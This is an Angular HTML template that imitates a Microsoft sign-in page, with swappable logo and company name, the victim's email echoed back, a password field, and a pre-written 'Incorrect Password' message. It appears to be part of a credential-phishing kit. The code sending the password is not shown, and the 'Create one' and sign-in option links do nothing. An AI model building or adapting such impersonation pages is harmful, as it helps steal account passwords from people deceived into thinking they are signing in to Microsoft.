

  <div class="container" >
    <div class="row">
        <div class=" col-sm-5 bg-white mx-auto p-4" style="margin: 70px 0px;">
            <form>
                <img id="logoimg" [src]="forms" class="img-fluid" width="40px">&nbsp;<span id="logoname" class="align-middle h5" style="color: #747474;" class="link"> {{string}}</span><br><br>
                <span class="h5">Sign In</span><br>
                <div id="msg" style="display: none;" class="alert alert-danger">Incorrect Password</div>
                <br>
                <span id="error" style="display: none;" class="text-danger">That Microsoft account doesn't exist. Enter a different account</span>

                <div class="row" id="pass">
                    <div class="col-sm-12">
                        <i class="fas fa-arrow-left" id="back"></i>&nbsp;<span id="emailch">{{email}}</span><br><br>
                        <input type="password" name="Password" id="pr" placeholder="Password" #Password="ngModel" [(ngModel)]="form.Password"
                        class="form-control shadow-none bg-transparent" style="border-right: none;border-left: none;border-top: none; border-bottom: 1px solid grey;">
                        <!-- <br> -->
                        <!-- <a href="#">Forgot Password</a>
                        
                        <hr> -->

                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-12">
                        <p >No account? <span style="color: #007bff; cursor: pointer;">Create one!</span></p>
                        <p style="color: #007bff; cursor: pointer;">Sign in with a security key</p>
                        <p style="color: #007bff; cursor: pointer;">sign in options</p>
                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-12">
                        <div class="text-right">
                            <input type="submit" name="submit" value="Login" class="btn px-4 text-white" id="submit-btn" (click)="click()" style="background-color: #0066BA;">
                        </div>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
